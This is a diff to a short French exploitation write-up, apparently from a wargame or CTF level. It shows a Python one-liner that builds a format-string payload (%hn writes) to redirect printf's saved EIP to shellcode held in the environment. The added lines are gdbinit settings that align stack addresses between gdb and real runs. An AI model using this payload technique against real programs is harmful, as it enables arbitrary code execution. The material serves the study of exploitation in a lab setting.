@@ -9,7 +9,12 @@ On ecrit l'adresse de notre shellcode stoque dans l'environnement a l'eip de pri
 
 python -c "print '\xde''\xd4''\xff''\xbf' + 'aaaa' + '\xdc''\xd4''\xff''\xbf' + '%08x.' * 2 + '%049121x' + '%hn' + '%012360x' + '%hn'""
 
+
 Par contre il nous faut trouver l'adresse du eip du printf qui va varier entre l'execution sur gdb et celle réelle.
 Pour ce faire on wrap le programme dans un script shell qui va clean l'environnement : wtf.sh.
+
+on doit aussi rajouter ces lignes à notre gdbinit :
+unset env LINES
+unset env COLUMNS
 
 Et voila.
